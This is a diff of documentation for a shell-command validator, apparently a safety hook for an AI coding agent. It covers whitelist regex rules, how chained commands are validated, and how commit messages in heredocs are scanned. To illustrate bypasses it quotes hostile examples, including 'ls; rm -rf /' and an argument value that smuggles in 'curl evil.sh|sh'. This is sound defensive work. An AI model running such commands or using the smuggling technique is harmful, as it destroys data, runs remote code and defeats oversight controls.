@@ -121,6 +121,10 @@ whitelist:
 
 - Patterns are regex, matched against the start of a **single command** (like `re.match()`)
 - A match bypasses ALL rule checks — the command is allowed unconditionally
+- For a **chained** command (`a; b`, `a && b`, `a | b`), a prefix match is not enough: each
+  segment is validated on its own unless a pattern writes every separator and spans the
+  *entire* command (see below). `^ls\b` allows `ls -la`, but `ls; rm -rf /` is still BLOCKED
+  on the `rm`
 - User whitelist patterns merge with built-in whitelist patterns from the plugin
 - Invalid regex patterns are skipped with a warning (won't crash the validator)
 
@@ -135,14 +139,15 @@ it end to end:
 ```yaml
 whitelist:
   # Whitelists this pipeline as a whole; `gh auth token` alone stays blocked.
-  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+\S+\s+-u\s+\S+\s+--password-stdin$
+  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+ghcr\.io\s+-u\s+[A-Za-z0-9._@-]+\s+--password-stdin$
 ```
 
 Your pattern is then held to the number of commands it declared. That entry writes one
 separator, so it speaks for exactly two commands; if the line turns out to hold three, the
-entry does not cover it and every command is judged on its own. This matters because `\S+`
-and friends happily match a `;` — `docker login ghcr.io -u foo;curl evil.sh|sh;true
---password-stdin` satisfies the pattern above end to end, and counting is what refuses it.
+entry does not cover it and every command is judged on its own. This matters because a loose
+slot such as `\S+` happily matches a `;` — had the user slot above been `\S+`,
+`-u foo;curl evil.sh|sh;true` would satisfy the pattern end to end, and counting is what
+refuses it.
 
 Write the pipeline on one line or several, as you like: a newline after `|` or `&&` is a
 continuation, not an extra command, and is counted as such.
@@ -168,6 +173,11 @@ whitelist:
 # BAD: Too broad — matches ALL gcloud commands including dangerous ones
 whitelist:
   - ^gcloud
+
+# BAD: anchored but greedy — ".*" accepts any arguments at all, so the "$" pins
+# nothing (it cannot clear a chained command, since it writes no separator)
+whitelist:
+  - ^npm\s+run\s+.*$
 ```
 
 Use `$` at the end when you want to match the exact command. Without `$`, the pattern matches
@@ -175,8 +185,12 @@ any command that starts with the pattern text — including extra arguments you 
 to allow, so `^chmod\s+[0-7]{3}\s+/tmp/` also clears `chmod 755 /tmp/x /etc/shadow`.
 
 `$` on its own is not enough if what precedes it is open-ended: `^mytool\s+.*$` is anchored
-and still matches anything, arguments and appended commands alike. Anchor against a bounded
-expression — `^mytool\s+[\w.-]+$`, not `^mytool\s+.*$`.
+and still matches anything. Spell out the characters each slot accepts (e.g. `[\w./:-]+`)
+rather than using `.*` or `\S+`, which match `;`, `&`, `|`, `>` and `${IFS}` happily.
+
+Spelling out separators is not enough for a path or host slot: `[\w./:-]+` still accepts `..`
+and `host.evil.com`. Pin a host literally and reject `.` / `..` segments; the built-in `rm -rf`
+and `gh auth token` entries in `00_whitelist.yaml` show the shape.
 
 #### Security: User-Level Only
 
@@ -281,8 +295,17 @@ The blocker scans the **command string**. Some git forms deliver the commit mess
 *outside* the command, so there is nothing in the command to scan (issue #76):
 
 - `git commit -F <file>` / `git commit --file=<file>` — message lives in a file
-- `git commit -F -` and heredocs — message arrives on stdin at execution time
+- `git commit -F -` fed by a **piped** or **interactive** stdin — the bytes live in a prior
+  pipe segment or are typed at execution time, not in the command string
 - `git commit -m "$(cat file)"` / backticks — the substitution is not expanded yet
+- more than `_MAX_HEREDOC_OPENERS` heredocs in one Bash call — refuses to guess rather than
+  scan unboundedly (a documented cap, not a delivery form)
+
+`git commit -F -` / `--file -` fed by an **in-command heredoc** (`git commit -F- <<EOF`) is
+different: its bytes ARE in the command string, so it is scanned like any other message,
+regardless of how many other heredocs (a `gh pr create --body-file -` in the same Bash call,
+a leading `cat <<DATA`, …) share the call — each heredoc body is bound to its own `<<` opener
+in source order.
 
 Because a `PreToolUse` hook runs **before** the command executes, this content does not exist
 where the hook can see it. The `unscannable_message_action` setting decides what happens when
